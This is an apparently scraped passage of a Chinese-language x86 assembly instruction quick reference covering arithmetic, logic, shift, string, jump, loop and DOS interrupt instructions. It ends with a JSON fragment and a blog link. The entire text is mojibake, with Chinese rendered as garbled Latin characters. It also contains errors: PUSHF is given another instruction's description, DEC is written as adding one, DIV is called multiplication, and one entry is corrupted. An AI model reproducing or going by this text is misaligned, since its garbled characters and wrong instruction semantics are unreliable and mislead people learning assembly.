å­—èŠ‚ï¼Œå‰ä¸¤ä¸ªå­—èŠ‚é€åˆ°ç›®çš„å¯„å­˜å™¨ï¼Œåä¸¤ä¸ªå­—èŠ‚é€åˆ° DS/ESã€‚ æ ‡å¿—ä¼ é€æŒ‡ä»¤ PUSHF &amp; POPF æ ¼å¼ï¼šPUSHF &amp; POPF å«ä¹‰ï¼šå°†æ ‡å¿—å¯„å­˜å™¨å‹æ ˆ/å‡ºæ ˆ åŠŸèƒ½ï¼šä»æºæ“ä½œæ•°æŒ‡å®šçš„å­˜å‚¨å•å…ƒä¸­å–å‡º 4 å­—èŠ‚ï¼Œå‰ä¸¤ä¸ªå­—èŠ‚é€åˆ°ç›®çš„å¯„å­˜å™¨ï¼Œåä¸¤ä¸ªå­—èŠ‚é€åˆ° DS/ESã€‚ LAHF &amp; SAHF æ ¼å¼ï¼šLAHF &amp; SAHF å«ä¹‰ï¼šLoad(Store) AH from(into) Flags åŠŸèƒ½ï¼šå°†æ ‡å¿—å¯„å­˜å™¨é€åˆ° AH &amp; å°† AH é€åˆ°æ ‡å¿—å¯„å­˜å™¨ è¾“å…¥è¾“å‡ºæŒ‡ä»¤ IN &amp; OUT æ ¼å¼ï¼šIN AL/AX, ADDR &amp; OUT ADDR, AL/AX åŠŸèƒ½ï¼šä»ç«¯å£åœ°å€ï¼ˆå¯„å­˜å™¨ï¼‰è·å–æ•°æ®é€åˆ°å¯„å­˜å™¨ï¼ˆç«¯å£åœ°å€ï¼‰ åœ°å€æ ¼å¼ï¼šç«¯å£åœ°å€æœ‰ä¸¤ç§æ ¼å¼ï¼Œå°äº FFH æ—¶å¯ä»¥æ˜¯ç›´æ¥å†™å‡ºï¼Œå¦åˆ™å¿…é¡»å…ˆé€å…¥ DX å†ä½¿ç”¨ã€‚ ç®—æœ¯è¿ç®—æŒ‡ä»¤ åŠ å‡æ³•æŒ‡ä»¤ ADD &amp; ADC æ ¼å¼ï¼šADD dst,src &amp; ADC dst,src å«ä¹‰ï¼šï¼ˆå¸¦è¿›ä½ï¼‰åŠ æ³• åŠŸèƒ½ï¼šdst = src + dst (+ CF) INC æ ¼å¼ï¼šINC dst åŠŸèƒ½ï¼šè‡ªå¢ 1ï¼Œdst = dst + 1 SUB &amp; SBB: æ ¼å¼ï¼šSUB dst,src &amp; SBB dst,src å«ä¹‰ï¼šï¼ˆå¸¦å€Ÿä½ï¼‰å‡æ³• åŠŸèƒ½ï¼šdst = dst - src (- CF) DEC: æ ¼å¼ï¼šDEC dst åŠŸèƒ½ï¼šè‡ªå‡ 1ï¼Œdst = dst + 1 NEG: æ ¼å¼ï¼šNEG dst åŠŸèƒ½ï¼šå¯¹ç›®çš„æ“ä½œæ•°å–è´Ÿï¼Œdst = -dst ä¹˜é™¤æ³•æŒ‡ä»¤ MUL &amp; IMUL æ ¼å¼ï¼šIMUL src &amp; MUL src å«ä¹‰ï¼šæ— ç¬¦å·æ•°/æ•´æ•°ä¹˜æ³• åŠŸèƒ½ï¼šåªæœ‰ä¸€ä¸ªæºæ“ä½œæ•°ï¼Œå½“å…¶ä¸º 8 ä½æ—¶ï¼ŒAX = AL * srcï¼Œä¸º 16 ä½æ—¶ï¼Œï¼ˆDX,AXï¼‰= AX * src DIV &amp; IDIV æ ¼å¼ï¼šIDIV src &amp; DIV src å«ä¹‰ï¼šæ— ç¬¦å·æ•°/æ•´æ•°ä¹˜æ³• åŠŸèƒ½ï¼šåªæœ‰ä¸€ä¸ªæºæ“ä½œæ•°ä½œä¸ºé™¤æ•°ï¼Œå½“å…¶ä¸º 8 ä½æ—¶ï¼ŒAX ä¸ºè¢«é™¤æ•°ï¼ŒAL ä½œä¸ºå•†ï¼ŒAH ä½œä¸ºä½™æ•°ã€‚å½“ src ä¸º 16 ä½æ—¶ï¼Œï¼ˆDX,AXï¼‰ä½œä¸ºè¢«é™¤æ•°ï¼ŒAX ä½œä¸ºå•†ï¼ŒDX ä½œä¸ºä½™æ•°ã€‚ é€»è¾‘è¿ç®—ä¸ç§»ä½æŒ‡ä»¤ é€»è¾‘è¿ç®— æŒ‡ä»¤ åŠŸèƒ½ NOT dst å–åï¼Œé€»è¾‘é AND dst,src é€»è¾‘ä¸ OR dst,src é€»è¾‘æˆ– XOR dst,src å¼‚æˆ– ç®—æœ¯é€»è¾‘ç§»ä½ æŒ‡ä»¤ å«ä¹‰ åŠŸèƒ½ SAL dst,cnt Shift Arithmetic Left ç®—æœ¯å·¦ç§» cnt ä½ SAR dst,cnt Shift Arithmetic Right ç®—æœ¯å³ç§» cnt ä½ SHL dst,cnt Shift Logic Left é€»è¾‘å·¦ç§» cnt ä½ SHR dst,cnt Shift Logic Right é€»è¾‘å³ç§» cnt ä½ cnt ä¸º 1 æˆ–è€… CLã€‚ç®—æœ¯å³ç§»æ—¶è¡¥æœ€é«˜ä½ï¼Œé€»è¾‘å³ç§»è¡¥ 0ï¼Œè¢«ç§»å‡ºçš„ç§»å…¥ CFã€‚ å¾ªç¯ç§»ä½ æŒ‡ä»¤ å«ä¹‰ åŠŸèƒ½ ROL dst,cnt Rotate Left å¾ªç¯å·¦ç§» cnt ä½ ROR dst,cnt Rotate Right å¾ªç¯å³ç§» cnt ä½ RCL dst,cnt Rotate through Carry Left å¸¦è¿›ä½å·¦ç§» cnt ä½ RCR dst,cnt Rotate through Carry Right å¸¦è¿›ä½å³ç§» cnt ä½ å­—ç¬¦ä¸²æ“ä½œæŒ‡ä»¤ æŒ‡ä»¤ï¼ˆå­—èŠ‚/å­—ï¼‰ åŠŸèƒ½ MOVSB / MOVSW å­—ç¬¦ä¸²ä¼ é€ CMPSB / CMPSW å­—ç¬¦ä¸²æ¯”è¾ƒ SCASB / SCASW å­—ç¬¦ä¸²æ‰«æ LODSB / LODSW å­—ç¬¦ä¸²è£…å…¥ STOSB / STOSW å­—ç¬¦ä¸²å­˜å‚¨ å¯¹äºåä¸‰æ¡æŒ‡ä»¤ï¼Œæ“ä½œä½¿ç”¨ AL/AX å¯„å­˜å™¨ï¼ˆæ ¹æ®æ“ä½œæ•°ç±»å‹å†³å®šï¼‰ã€‚ æºä¸²èµ·å§‹åœ°å€ä¸º DS:SIï¼Œç›®çš„ä¸²ä½äº ES:DI æ¯ä¸€æ¬¡æ“ä½œéƒ½ä¼šè‡ªåŠ¨ä¿®æ”¹ SI å’Œ DI DF æ ‡å¿—ä½å¯ä»¥æ§åˆ¶å­—ç¬¦ä¸²å¤„ç†æ–¹å‘ï¼ŒDF = 0 é€’å¢ï¼ŒDF = 1 é€’å‡ï¼Œå¯é€šè¿‡ CLD/STD è®¾ç½® å¤„ç†å­—ç¬¦ä¸²é•¿åº¦æ”¾åœ¨ CX ä¸­ è¿™äº›æŒ‡ä»¤å‰å¯ä»¥ç”¨é‡å¤å‰ç¼€ REP åå¤æ‰§è¡Œï¼Œæˆ–æ˜¯ REPE/REPZ ç›¸ç­‰/ä¸ºé›¶åˆ™é‡å¤ï¼ŒREPNE/REPNZ ä¸ç›¸ç­‰/éé›¶åˆ™é‡å¤ã€‚ å¤„ç†å™¨æ§åˆ¶æŒ‡ä»¤ æ ‡å¿—å¤„ç†æŒ‡ä»¤ æŒ‡ä»¤ å«ä¹‰ åŠŸèƒ½ CLC Clear Carry CF = 0 CMC Complement Carry CF = NOT CF STC Set Carry CF = 1 CLD Clear Direction DF = 0 STD Set Direction DF = 1 CLI Clear Interrupt IF = 0 STI Set Interrupt IF = 1 å¤–éƒ¨åŒæ­¥æŒ‡ä»¤ ESC æ ¼å¼ï¼šESC å¤–éƒ¨æ“ä½œç ï¼Œsrc åŠŸèƒ½ï¼šç”¨æ¥å®ç°å¯¹ 8087 åå¤„ç†å™¨æ§åˆ¶ã€‚ WAIT æ ¼å¼ï¼šWAIT åŠŸèƒ½ï¼šå¾€å¾€è·Ÿåœ¨ ESC åç­‰å¾…ï¼Œç›´åˆ° Â¯Â¯Â¯Â¯Â¯Â¯Â¯Â¯Â¯Â¯Â¯Â¯Â¯Â¯Â¯TESTTESTÂ¯ ä¸ºä½ç”µå¹³ã€‚ LOCK æ ¼å¼ï¼šLOCK åŠŸèƒ½ï¼šå°é”æ€»çº¿ï¼Œç¦æ­¢å…¶ä»–å¤„ç†å™¨ä½¿ç”¨æ€»çº¿ã€‚ åœæœºå’Œç©ºæ“ä½œ HLT æ ¼å¼ï¼šHLT åŠŸèƒ½ï¼šè¿›å…¥æš‚åœçŠ¶æ€ä¸è¿›è¡Œä»»ä½•æ“ä½œï¼Œç›´åˆ°å¤ä½æˆ– NMI å¼•è„š/INTR å¼•è„šå‡ºç°ä¸­æ–­è¯·æ±‚ä¿¡å·ã€‚ NOP æ ¼å¼ï¼šNOP åŠŸèƒ½ï¼šè€—è´¹ä¸‰ä¸ªæ—¶é’Ÿå‘¨æœŸä½†ä¸è¿›è¡Œä»»ä½•æ“ä½œã€‚ æ§åˆ¶è½¬ç§»æŒ‡ä»¤ æ¯”è¾ƒæŒ‡ä»¤ CMP æ ¼å¼ï¼šCMP dst,src åŠŸèƒ½ï¼šç”¨ dst å‡å» srcï¼Œä½†ç»“æœä»…åæ˜ åˆ°æ ‡å¿—ä½ï¼Œä¸é€å›ç›®çš„æ“ä½œæ•°ã€‚ TEST æ ¼å¼ï¼šTEST dst,src åŠŸèƒ½ï¼šå¯¹ä¸¤ä¸ªæ“ä½œæ•°ä½œé€»è¾‘ä¸ï¼Œç»“æœä»…åæ˜ åˆ°æ ‡å¿—ä½ï¼Œä¸é€å›ç›®çš„æ“ä½œæ•°ã€‚ æ— æ¡ä»¶è½¬ç§» JMP æ ¼å¼ï¼šJMP dst åŠŸèƒ½ï¼šæ— æ¡ä»¶è·³è½¬åˆ°ç›®çš„åœ°å€ã€‚ è·³è½¬åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯æ®µå†…è½¬ç§»æˆ–è¿‘ï¼ˆNEARï¼‰è½¬ç§»ï¼Œè·³è½¬æ—¶ä»…æ”¹å˜ IP çš„å€¼ï¼Œå¦ä¸€ç§æ˜¯æ®µé—´è½¬ç§»æˆ–è¿œï¼ˆFARï¼‰è½¬ç§»ï¼Œæ­¤æ—¶è·³è½¬é•¿åº¦è¶…è¿‡ IP æœ€å¤§å€¼ï¼ŒCS å’Œ IP éƒ½è¦æ”¹å˜ã€‚è¿™ä¸¤ç§æƒ…å†µéƒ½æä¾›ç›´æ¥è½¬ç§»å’Œé—´æ¥è½¬ç§»ä¸¤ç§æ–¹æ³•ï¼Œå‰è€…ç›´æ¥ç»™å‡ºç›®çš„åœ°å€ï¼Œåè€…å°†ç›®çš„åœ°å€æ”¾åœ¨å¯„å­˜å™¨æˆ–è€…å­˜å‚¨å•å…ƒä¸­ã€‚ ç±»å‹ æ–¹å¼ å¯»å€ç›®æ ‡ ä¸¾ä¾‹ æ®µå†… ç›´æ¥ ç«‹å³çŸ­è½¬ç§»ï¼ˆ8ä½ï¼‰ JMP SHORT æ ‡å· æ®µå†… ç›´æ¥ ç«‹å³è¿‘è½¬ç§»ï¼ˆ16ä½ï¼‰ JMP NEAR PTR æ ‡å·æˆ–JMP æ ‡å· æ®µå†… é—´æ¥ å¯„å­˜å™¨ï¼ˆ16ä½ï¼‰ JMP BX æ®µå†… é—´æ¥ å­˜å‚¨å™¨ï¼ˆ16ä½ï¼‰ JMP WORD PTR 5[BX] æ®µé—´ ç›´æ¥ ç«‹å³è½¬ç§»ï¼ˆ32ä½ï¼‰ JMP FAR PTR æ ‡å· æ®µé—´ é—´æ¥ å­˜å‚¨å™¨ï¼ˆ32ä½ï¼‰ JMP DWORD PTR[REG] CALL æ ¼å¼ï¼šCALL è¿‡ç¨‹å åŠŸèƒ½ï¼šè°ƒç”¨è¿‡ç¨‹ã€‚ åŒæ ·æœ‰æ®µå†…ä¸æ®µé—´ï¼Œç›´æ¥ä¸é—´æ¥çš„åŒºåˆ†ï¼ŒæŒ‡ä»¤æ ¼å¼ä¸ JMP ç±»ä¼¼ã€‚ ç±»å‹ æ–¹å¼ å¯»å€ç›®æ ‡ ä¸¾ä¾‹ æ®µå†… ç›´æ¥ ç«‹å³è°ƒç”¨ CALL æ ‡å· æ®µå†… é—´æ¥ å¯„å­˜å™¨ï¼ˆ16ä½ï¼‰ CALL BX æ®µå†… é—´æ¥ å­˜å‚¨å™¨ï¼ˆ16ä½ï¼‰ CALL WORD PTR 5[BX] æ®µé—´ ç›´æ¥ ç«‹å³è°ƒç”¨ï¼ˆ32ä½ï¼‰ CALL FAR PTR æ ‡å· æ®µé—´ é—´æ¥ å­˜å‚¨å™¨ï¼ˆ32ä½ï¼‰ CALL DWORD PTR[REG] RET æ ¼å¼ï¼šRET (n) åŠŸèƒ½ï¼šè¿‡ç¨‹è¿”å›ã€‚å¦‚æœæœ‰ n åˆ™åœ¨å¼¹å‡ºè¿”å›åœ°å€åå†å¼¹å‡º n ä¸ªå­—èŠ‚ï¼Œè¿™ä¸€ç›®çš„æ˜¯è®©è°ƒç”¨è¿‡ç¨‹å¯ä»¥ä¼ é€’å‚æ•°ã€‚ æ¡ä»¶è½¬ç§» æ ¼å¼ï¼šæ“ä½œç¬¦ æ ‡å· åŠŸèƒ½ï¼šæ ¹æ®æ“ä½œç¬¦ï¼Œæ»¡è¶³å³è·³è½¬åˆ°æ ‡å·ã€‚ ç›´æ¥æ ‡å¿—è½¬ç§» æŒ‡ä»¤ æµ‹è¯•æ¡ä»¶ åˆ¤æ–­æ¡ä»¶ JC/JNC CF = 1 / 0 æœ‰ / æ— è¿›ä½ JZ/JNZ ZF = 1 / 0 ç›¸ç­‰ / ä¸ç›¸ç­‰ JE/JNE ZF = 1 / 0 ç›¸ç­‰ / ä¸ç›¸ç­‰ JS/JNS SF = 1 / 0 ç¬¦å·ä¸ºè´Ÿ / æ­£ JO/JNO OF = 1 / 0 æº¢å‡º / æ— æº¢å‡º JP/JNP PF = 1 / 0 ä¸ºå¶æ•° / å¥‡æ•° JPE/JPO PF = 1 / 0 ä¸ºå¶æ•° / å¥‡æ•° æ— ç¬¦å·æ•°æ¯”è¾ƒæµ‹è¯• æŒ‡ä»¤ æµ‹è¯•æ¡ä»¶ åˆ¤æ–­æ¡ä»¶ JA/JNBE CF âˆ¨âˆ¨ ZF = 0 é«˜äº / ä¸ä½äºç­‰äº JAE/JNB CF = 0 é«˜äºç­‰äº / ä¸ä½äº JNAE/JB CF = 1 ä¸é«˜äºç­‰äº / ä½äº JNA/JBE CF âˆ¨âˆ¨ ZF = 1 ä¸é«˜äº / ä½äºç­‰äº æœ‰ç¬¦å·æ•°æ¯”è¾ƒæµ‹è¯• æŒ‡ä»¤ æµ‹è¯•æ¡ä»¶ åˆ¤æ–­æ¡ä»¶ JG/JNLE (SF XORXOR OF) âˆ¨âˆ¨ ZF = 0 å¤§äº / ä¸å°äºç­‰äº JGE/JNL SF XORXOR OF = 0 å¤§äºç­‰äº / ä¸å°äº JNGE/JL SF XORXOR OF = 1 ä¸å¤§äºç­‰äº / å°äº JNG/JLE (SF XORXOR OF) âˆ¨âˆ¨ ZF = 1 ä¸å¤§äº / å°äºç­‰äº å¾ªç¯æ§åˆ¶æŒ‡ä»¤ LOOP æ ¼å¼ï¼šLOOP æ ‡å· åŠŸèƒ½ï¼šè·³è‡³æ ‡å·ç»§ç»­å¾ªç¯ï¼Œæ¯æ‰§è¡Œä¸€æ¬¡ CX å‡ä¸€ï¼Œè‹¥å‡ä¸€åä¸ºé›¶åˆ™ä¸è·³è½¬ã€‚ LOOPE &amp; LOOPNE æ ¼å¼ï¼šLOOPE æ ‡å· &amp; LOOPNE æ ‡å· åŠŸèƒ½ï¼šï¼ˆä¸ï¼‰ç›¸ç­‰æ—¶å¾ªç¯ï¼Œå…¶ä»–ä¸ LOOP ç›¸åŒã€‚ LOOPZ &amp; LOOPNZ æ ¼å¼ï¼šLOOPZ æ ‡å· &amp; LOOPNZ æ ‡å· åŠŸèƒ½ï¼šç»“æœï¼ˆä¸ï¼‰ä¸ºé›¶æ—¶å¾ªç¯ï¼Œå…¶ä»–ä¸ LOOP ç›¸åŒã€‚ JCXZ æ ¼å¼ï¼šJCXZ æ ‡å· åŠŸèƒ½ï¼šCX ä¸ºé›¶åˆ™è·³è½¬ï¼Œå¦åˆ™å°±å¾€ä¸‹æ‰§è¡Œï¼Œ CS ä¸ä¼šå‡ä¸€ã€‚ ä¸­æ–­æŒ‡ä»¤ INT æ ¼å¼ï¼šINT n åŠŸèƒ½ï¼šè°ƒç”¨ n å¯¹åº”çš„åŠŸèƒ½ã€‚ INTO æ ¼å¼ï¼šINTO åŠŸèƒ½ï¼šå¦‚æœæº¢å‡ºæ ‡è¯† OF ä¸º 1 åˆ™äº§ç”Ÿç±»å‹ä¸º 4 çš„ä¸­æ–­ï¼Œå¦åˆ™å°±ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ IRET æ ¼å¼ï¼šIRET åŠŸèƒ½ï¼šä¸­æ–­è¿”å›ã€‚ BIOS &amp; DOS è°ƒç”¨ è°ƒç”¨è¿™ä¸¤è€…ç”¨çš„æ˜¯ INT ä¸­æ–­æŒ‡ä»¤ã€‚ æ ¼å¼ï¼šINT n åŠŸèƒ½ï¼šè°ƒç”¨ n å¯¹åº”çš„åŠŸèƒ½ã€‚ å…¶ä¸­ n = 21H æ˜¯æœ€ä¸ºå¼ºå¤§çš„ DOS ä¸­æ–­ã€‚ä¸€èˆ¬è°ƒç”¨ä¸­æ–­é¡»å…ˆå°†å‚æ•°æ”¾å…¥æŒ‡å®šå¯„å­˜å™¨ï¼ŒåŠŸèƒ½å·æ”¾å…¥ AHï¼Œå­åŠŸèƒ½å·æ”¾å…¥ ALï¼Œä¾‹å¦‚ 1 2 MOV AX,4C00H INT 21H å¸¸ç”¨çš„åŠŸèƒ½å·æœ‰ åŠŸèƒ½å· åŠŸèƒ½ å‚æ•° 01H è¾“å…¥ä¸€ä¸ªå­—ç¬¦ AL = è¾“å…¥å­—ç¬¦ 0AH è¾“å…¥å­—ç¬¦ä¸² DX:DX = ç¼“å†²åŒºé¦–åœ°å€ 02H æ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ DL = æ˜¾ç¤ºå­—ç¬¦ 09H æ˜¾ç¤º $ ç»“å°¾çš„å­—ç¬¦ä¸² DX:DX = å­—ç¬¦ä¸²é¦–åœ°å€ ","link":"https://Zer0-hex.github.io/x86-chang-yong-hui-bian-zhi-ling-su-cha-biao/"}]}